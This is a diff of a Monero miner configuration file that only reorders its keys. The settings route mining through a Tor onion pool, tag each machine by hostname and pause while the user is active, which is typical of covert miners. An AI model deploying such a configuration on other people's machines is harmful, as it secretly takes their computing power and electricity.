@@ -5,26 +5,26 @@
     "huge-pages": true,
     "priority": 1
   },
-  "opencl": {
-    "enabled": false
-  },
   "cuda": {
     "enabled": false
   },
   "donate-level": 0,
   "donate-over-proxy": 0,
+  "opencl": {
+    "enabled": false
+  },
+  "pause-on-active": 300,
+  "pause-on-battery": true,
   "pools": [
     {
       "coin": "monero",
-      "url": "mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10512",
-      "user": "46cWMT5YP2A8a8bSDzj3r7C7XkCkTWvJz2FFDjqnk8hnATYCrBJD22R1cyZJwK4tDTNGHFMTuSkCbNZeaYjhPADx9QisCcA",
-      "pass": "HOSTNAME",
-      "keepalive": true,
       "enabled": true,
+      "keepalive": true,
+      "pass": "HOSTNAME",
+      "socks5": 9050,
       "tls": false,
-      "socks5": 9050
+      "url": "mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10512",
+      "user": "46cWMT5YP2A8a8bSDzj3r7C7XkCkTWvJz2FFDjqnk8hnATYCrBJD22R1cyZJwK4tDTNGHFMTuSkCbNZeaYjhPADx9QisCcA"
     }
-  ],
-  "pause-on-battery": true,
-  "pause-on-active": 300
+  ]
 }
